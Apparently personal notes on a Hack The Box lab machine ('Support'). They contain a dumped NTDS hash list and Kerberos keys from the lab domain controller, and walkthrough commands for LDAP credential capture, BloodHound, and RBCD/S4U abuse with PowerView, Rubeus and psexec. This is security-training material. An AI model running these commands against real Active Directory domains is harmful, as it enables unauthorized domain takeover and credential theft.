 0010   E9 EE B2 38 B7 E0 34 5F  12 36 AB 44 F2 4F 75 7D   ...8..4_.6.D.Ou}
 0020   56 22 0F 0F 3C 2D 2E 4C  E6 FD 61 01 63 A4 32 B4   V"..<-.L..a.c.2.
 0030   CE 66 7B DB E7 CF 28 F8  4C 9E 9C 46 A0 61 1B 8B   .f{...(.L..F.a..
NL$KM:d7803fc77667b322e7c99b9833d7f1a4e9eeb238b7e0345f1236ab44f24f757d56220f0f3c2d2e4ce6fd610163a432b4ce667bdbe7cf28f84c9e9c46a0611b8b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::
ldap:1104:aad3b435b51404eeaad3b435b51404ee:b735f8c7172b49ca2b956b8015eb2ebe:::
support:1105:aad3b435b51404eeaad3b435b51404ee:11fbaef07d83e3f6cde9f0ff98a3af3d:::
smith.rosario:1106:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
hernandez.stanley:1107:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
wilson.shelby:1108:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
anderson.damian:1109:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
thomas.raphael:1110:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
levine.leopoldo:1111:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
raven.clifton:1112:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
bardot.mary:1113:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
cromwell.gerard:1114:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
monroe.david:1115:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
west.laura:1116:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
langley.lucy:1117:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
daughtler.mabel:1118:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
stoll.rachelle:1119:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
ford.victoria:1120:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:0bf2e98d5fe97df54362cca10b807bd9:::
MANAGEMENT$:2601:aad3b435b51404eeaad3b435b51404ee:3f99f2f26988d1f348d378e84f86bc58:::
GR4YPC$:5101:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f5301f54fad85ba357fb859c94c5c31a6abe61f6db1986c03574bfd6c2e31632
Administrator:aes128-cts-hmac-sha1-96:678dcbcbf92bc72fd318ac4aa06ede64
Administrator:des-cbc-md5:13a8c8abc12f945e
krbtgt:aes256-cts-hmac-sha1-96:21f4a7ed00009605ac5182a3d607d25447f48a3f13fbf60912f1e863a70d7141
krbtgt:aes128-cts-hmac-sha1-96:e963352bcdd503ddc3017a2afd620ccb
krbtgt:des-cbc-md5:70b3fdaefe454ad5
ldap:aes256-cts-hmac-sha1-96:f54423bd0d85939de61519c02fad691596f47c0a34cdf0983131bb962ee6ae7a
ldap:aes128-cts-hmac-sha1-96:0447dc15751883c29d9f450acc95db3d
ldap:des-cbc-md5:2ada4ccbcbceb901
support:aes256-cts-hmac-sha1-96:ada63670275687524019008a737c3b57cbf2d1be9eb08a60954a3dcb9268f4e4
support:aes128-cts-hmac-sha1-96:34a8a853cee33abe1668d7660a1affd9
support:des-cbc-md5:79fdc47f98ea70f2
smith.rosario:aes256-cts-hmac-sha1-96:4ce2d5be0ad97e2ff69e7103f3baee3ee58826dbf6061187f266859a294648b3
smith.rosario:aes128-cts-hmac-sha1-96:d181b8c4247a3fa19d7ad76d0026b264
smith.rosario:des-cbc-md5:495d086b52917c6e
hernandez.stanley:aes256-cts-hmac-sha1-96:665165633c8446cfc4264434307c336ddfd91372fda23dc318fb99369c6b78ec
hernandez.stanley:aes128-cts-hmac-sha1-96:8f62b1cba1910f730d905fe388acd69c
hernandez.stanley:des-cbc-md5:a24a340ec885046b
wilson.shelby:aes256-cts-hmac-sha1-96:3f72fd104691e5c59664834bba1d4b9ddbbfea30605cb2120fafa1ee8720b502
wilson.shelby:aes128-cts-hmac-sha1-96:1ea7512778994ec36b259d590df0a188
wilson.shelby:des-cbc-md5:622089cb10152fcd
anderson.damian:aes256-cts-hmac-sha1-96:cb56856b143d38b9191d16ab1e64f9460d06f29a406b37f3da9925a21d87d092
anderson.damian:aes128-cts-hmac-sha1-96:e18d3688bcacab591dabf00f080369f4
anderson.damian:des-cbc-md5:329ee6d3405834e5
thomas.raphael:aes256-cts-hmac-sha1-96:c1c5ec89304832e7bbbc3cc2a108671df6464bd5989e8156e84e540bcac12ac0
thomas.raphael:aes128-cts-hmac-sha1-96:e5212c20b62c46245fc7e3843b4db754
thomas.raphael:des-cbc-md5:8c2064c4e975e31c
levine.leopoldo:aes256-cts-hmac-sha1-96:f3f471fa904dafa639d562b713ca57d6668e8e58c4838490e1e038f70e86fabb
levine.leopoldo:aes128-cts-hmac-sha1-96:3b8c7b502154308728e6092a0c524190
levine.leopoldo:des-cbc-md5:0464734a207f5d04
raven.clifton:aes256-cts-hmac-sha1-96:5ead58d4439aa8e64ce828f628629b0798c192f9925908670779a212178bce70
raven.clifton:aes128-cts-hmac-sha1-96:a3862f3e0c9096d735eb9e075b46ed9e
raven.clifton:des-cbc-md5:b6252651b01ff452
bardot.mary:aes256-cts-hmac-sha1-96:54123fcaa07765a4d8136cf95cff67173d31d6c049f1d0936cb33c257aab20c5
bardot.mary:aes128-cts-hmac-sha1-96:a941571a50d40fa5771c8deffa44a501
bardot.mary:des-cbc-md5:bc79e0a8f7dfdc10
cromwell.gerard:aes256-cts-hmac-sha1-96:397983e21a3742e1d9c53bd51570a89dfdb9b79cfc15eb294500e16eee9c5a0c
cromwell.gerard:aes128-cts-hmac-sha1-96:a495521b2d0992a21d0cd6b968dbb042
cromwell.gerard:des-cbc-md5:0e2f37ae7c58310b
monroe.david:aes256-cts-hmac-sha1-96:13dd6e3f424e0e3b394964ceaf9f739c19a680c97648b1531b8e417012d9775d
monroe.david:aes128-cts-hmac-sha1-96:a15fd3bccfb2e7ead3bdf2fe4c47f355
monroe.david:des-cbc-md5:a86b5829047f2557
west.laura:aes256-cts-hmac-sha1-96:54a3167b1c9ee166874a6b09b08621394b049197270d4b754e8fedb78ee86b88
west.laura:aes128-cts-hmac-sha1-96:864381e434a5856d85c1f61bc8726378
west.laura:des-cbc-md5:8a923480ec7cd9d3
langley.lucy:aes256-cts-hmac-sha1-96:f2415b075b6e205864de19917a9989398672b062dad29d58af177d358e086998
langley.lucy:aes128-cts-hmac-sha1-96:20cdc3297fc8138726e34e45ba9f73d6
langley.lucy:des-cbc-md5:fd738a3dd0028fb0
daughtler.mabel:aes256-cts-hmac-sha1-96:7ce8f29915849ec300bd81341759d19c67e045501e1ee7e198fe37a7ee51af8d
daughtler.mabel:aes128-cts-hmac-sha1-96:791efedf5473d798dbc3267ce6d045aa
daughtler.mabel:des-cbc-md5:01ba80795bbc3ea8
stoll.rachelle:aes256-cts-hmac-sha1-96:d9cca58315e797cdb21ca8ad71278112357291a970a90084586a38d4c5ff38c2
stoll.rachelle:aes128-cts-hmac-sha1-96:c7768011ce94e18fae341bdfb5223bc3
stoll.rachelle:des-cbc-md5:b63d15683434b38f
ford.victoria:aes256-cts-hmac-sha1-96:de0a90f4f874ebb0937df96bc14308dcbb54835ac622ad16b79cf9509313f205
ford.victoria:aes128-cts-hmac-sha1-96:2241c9137590e4bde952ac411a1c22c6
ford.victoria:des-cbc-md5:13d573730ba8641f
DC$:aes256-cts-hmac-sha1-96:8967dbe9fbee0f7c51a1d6fd27d7a000c3f8076917f6f9fffa25dedaae723e32
DC$:aes128-cts-hmac-sha1-96:05e4d9d3783b169a2f7e48437c1cdb8b
DC$:des-cbc-md5:52739e08613120c4
MANAGEMENT$:aes256-cts-hmac-sha1-96:e1080e0ca1d845206ef99d5b6d336095c3362efd55e516442de41738d18a1b92
MANAGEMENT$:aes128-cts-hmac-sha1-96:fcf45088bf727e997d0368bd88bdbf02
MANAGEMENT$:des-cbc-md5:40c7f4582c75b364
GR4YPC$:aes256-cts-hmac-sha1-96:88db6a3796b239829240e6d2f5ee673d9bdac0dfc80b3e57856f8b20b86ec971
GR4YPC$:aes128-cts-hmac-sha1-96:7e738ac61c94c774ce026f3dba65c4c4
GR4YPC$:des-cbc-md5:f480859b706dea64
```

- and we have retrieved all the hashes in the DC

Guides for RBCD
- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)
- [https://redfoxsec.com/blog/rbcd-resource-based-constrained-delegation-abuse/](https://redfoxsec.com/blog/rbcd-resource-based-constrained-delegation-abuse/)
- [https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd)
- [https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd](https://www.alteredsecurity.com/post/resource-based-constrained-delegation-rbcd)
- [https://medium.com/r3d-buck3t/how-to-abuse-resource-based-constrained-delegation-to-gain-unauthorized-access-36ac8337dd5a](https://medium.com/r3d-buck3t/how-to-abuse-resource-based-constrained-delegation-to-gain-unauthorized-access-36ac8337dd5a)


Walkthrough
- anonymous authentication in smb (use any username)
- then retrieve userinfo.exe
- he has powershell installed so he can run an exe file in linux
```
./UserInfo.exe -h
./UserInfo.exe -v find -first ippsec
```
whenever he sees a connect error, he opens up wireshark
capture on any
we will see it is trying to connect to support.htb, so we add that to our /etc/hosts
- then we get No such object exists
- if we check wireshark we will see the bind request and we can see credentials in simple authentication
- try to cme with the credentials
- then run blodhound with the credentials
```
python3 bloodhound.py --dns-tcp -ns 10.10.11.174 -d support.htb -u 'ldap' -p '<password>' -c all
```
- if we get an error failed to get tgt for dc.support.htb, we can add that to our etc/hosts file as well and run the bloodhound again
- if you see the end value of a group is more that 1000 that it is non default
- you can mark all these interesting stuff as high value in bloodhound
- domain admin is rid of 500
- then
```
ldapsearch -h support.htb -D 'ldap@support.htb' -w '<passpord>' -b 'dc=support,dc=htb'
```
- we can  download the sharp collection [https://github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection) (Rubeus is here)
- send powermad, powerview and rubeus on the target
- the directory C:\\programdata is usually world writable so we can download files here
- curl rubeus and IEX the ps1 scripts
- we can check if we can create machines if we run
```
Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | select ms-ds-machineaccountquota
```
and we can see 10
meaning we can create 10 machines
- then
```
.\Rubeus.exe hash /password:123456
```
and we get the rc4_hmac
- then 
```
.\Rubeus.exe s4u /password:123456 /user:FakeComputer$ /domain:support.htb
```

```
./rubeus.exe s4u /user:FakeComputer$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/DC.support.htb /domain:support.htb /ptt
```
but we get a KDC bad option
we can rerun bloodhound again and look at fale computer shortest path to DA from owned principals

- just rerun the genricall exploit commands again
- we save the hash generated in a file and we can use impacket ticket converter, first decode from base64
```
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
```
then we can do 
```
KRB5CCNAME=ticket.ccache psexec -k -no-pass support/administrator@dc.support.htb
```
-k is for kerberos
if it didn't work ir might be time issues, cause kerberos is time specific (tjhat clock skew thing) so we should use mdbdate to sync time

Instal powershell on linux
Follow the video
since powershell installed in kali, just run 
```
sudo apt install mono-complete

```



things tried

Using Powerview module
```
$ComputerSid = Get-DomainComputer GR4Y -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer GR4Y | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked, we run
Get-DomainComputer GR4Y -Properties 'msds-allowedtoactonbehalfofotheridentity'
```

it worked
![](assets/Support_assets/Pasted%20image%2020231116183637.png)
Perform the complete S4U  attack
```
.\Rubeus.exe hash /password:123456 /user:GR4Y$ /domain:support.htb
```
![](assets/Support_assets/Pasted%20image%2020231116184015.png)

```
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:123456 /user:GR4Y$ /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : GR4Y$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostgr4y.support.htb
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 95C59C0B079DFB8C5CD3A9266495ACF7
[*]       aes256_cts_hmac_sha1 : E6DDFF1AA0C2F678155BDB250EDBDC3440840065F8D5A5DA0D12B0B6F08D7151
[*]       des_cbc_md5          : 409719380BA7D937


```

```
./rubeus.exe s4u /user:GR4Y$ /aes256:E6DDFF1AA0C2F678155BDB250EDBDC3440840065F8D5A5DA0D12B0B6F08D7151 /aes128:95C59C0B079DFB8C5CD3A9266495ACF7 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/DC.support.htb /domain:support.htb /ptt
```

![](assets/Support_assets/Pasted%20image%2020231116184546.png)
```
*Evil-WinRM* PS C:\Users\support\Documents> ./rubeus.exe s4u /user:GR4Y$ /aes256:E6DDFF1AA0C2F678155BDB250EDBDC3440840065F8D5A5DA0D12B0B6F08D7151 /aes128:95C59C0B079DFB8C5CD3A9266495ACF7 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/DC.support.htb /domain:support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: E6DDFF1AA0C2F678155BDB250EDBDC3440840065F8D5A5DA0D12B0B6F08D7151
[*] Building AS-REQ (w/ preauth) for: 'support.htb\GR4Y$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFZjCCBWKgAwIBBaEDAgEWooIEcTCCBG1hggRpMIIEZaADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBCswggQnoAMCARKhAwIBAqKCBBkEggQVsW/fjjoQ
      bIpSxyxGehzQA3eQCAmbxQLfiSh7wLcytJtgPsIDDdeg4IGGsTTEEQNuR0xgGustrjAiM0xqNKY6ak2c
      3pVYl1YCjljE/OiKrxM/U9z8ooOe8IkK2uIcSHrtfvX0M8ywCucjjox5DCb/1HCv/972ZY8uvTMo4cR3
      oq7jsQXadrDhJn4OzyIvGjwVvs98KpPPknLLSX1KsATJIpB28rsWLb00nQVy6HAYbQbA33h3Gp9wzkkz
      BOuGbbjxJKQFzBpko8BQMLj/hFB28PMstUfftCF4gF0JtPwWrMlrqSmC8T+k7Z8m3rqMgl9DTWz10fTF
      vmHpN7bOUHe8n7HybPLcD4Md88X+htyWkde0PLXD1vNX9Joiv7Dd8e0+/9hapEA2psnzKq7b+KyJevX7
      XS6Zrqgr4/Hl2vfCasX+zCigRgfNc7r76QPAHUDQ+CJ0hQZayxoHdYk210+l2EhFi66silT+Wq2ptKUb
      OhiNam3o9Ra1XknCQxbxO0af3f8UGfl18n4CYlsyEqy4CWyC9125riYn8gIieSzJNXpRf3AqL/WLufL0
      +eWqEYO80CUAEWN+Vu9hFQYgJdyXmBczAoKYYBaaMexrG9kC5xzIVfzO/EcRU3WrED8Csfl5E5yJqGdF
      TRSzKf1mvU5DiIQcSyDgnwWqkxrApK6D0ft+3oMtOcxTTRKNyPN5927huoT7SvkBC6uJhB+IvjQjMFj/
      9KwdhJaZnpba8Tlp3tqh//ss/K8mkuQ7E9Z/3BaUbRp/1XwBQvuL7QuAYU9ceEBKUtwnp2qIcVoRJlpF
      ID/Tm1RQmK8Q3Ta2sl1GlkxyMFXjUmNFk77XXwVZNojr36vx1KseVsFCI/p2zPDOtnSiFbIyHE6Rl9uH
      doE9f8lW65L26Kra/EDSB8FP+lvB9iKIFeZx4U8onTAwDeXcypNQFTAZqQ0qiYnI480PjawmVoUQ/bKk
      fGovUYHn8BaUFjuREEW0lGtCIyV5K17Tw0Zu9R19sLms/1xpgzqxPj2p7FI4TnS5mr53ZbNLlO8LzPZF
      ZV0OntmY3m5AOgxrqDmnheUbrZ8Tk98LJbb8NFfotsm8YX72jUVt+/te5QKvx/97T60KZzIVXoKb26j4
      jbfvK5HecIfE4ikOwVZeBGavW3smylwMQOkKMqSBGHnzsSSWBvldwGiDlE3NAgtx85fJVBqlkgFdiRfX
      x3FdBHWsX6dBE+3XUsw0DaReZwnE/LykO1AKgzlqRfOeVo9VB0/kIeNvrljhJvfd3HDnPLiNRa/RIcc0
      PF++7Zo32hdqU74f5UF5lvlJBxULBo1ZKNP3tSCkQg0Q1OyLsg4RW2ynqRnyvax7JvdKDJu/X8rWwkpR
      EEFj5T389rLoSI+FfSNywowtbqOB4DCB3aADAgEAooHVBIHSfYHPMIHMoIHJMIHGMIHDoCswKaADAgES
      oSIEIEP8CWqH3htbRoGqbnPk+8qrCs5geran8Bj7+Bp2CraooQ0bC1NVUFBPUlQuSFRCohIwEKADAgEB
      oQkwBxsFR1I0WSSjBwMFAEDhAAClERgPMjAyMzExMTYxNzQ1MTVaphEYDzIwMjMxMTE3MDM0NTE1WqcR
      GA8yMDIzMTEyMzE3NDUxNVqoDRsLU1VQUE9SVC5IVEKpIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC3N1cHBv
      cnQuaHRi


[*] Action: S4U

[*] Building S4U2self request for: 'GR4Y$@SUPPORT.HTB'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2self request to ::1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'GR4Y$@SUPPORT.HTB'
[*] base64(ticket.kirbi):

      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
      WSQ=

[*] Impersonating user 'administrator' to target SPN 'cifs/DC.support.htb'
[*] Building S4U2proxy request for service: 'cifs/DC.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88

[X] KRB-ERROR (13) : KDC_ERR_BADOPTION


```

```
ls \\DC.domain.local\C$
```
![](assets/Support_assets/Pasted%20image%2020231116203809.png)

CN=Shared Support Accounts,CN=UsersDC=support,DC=htb
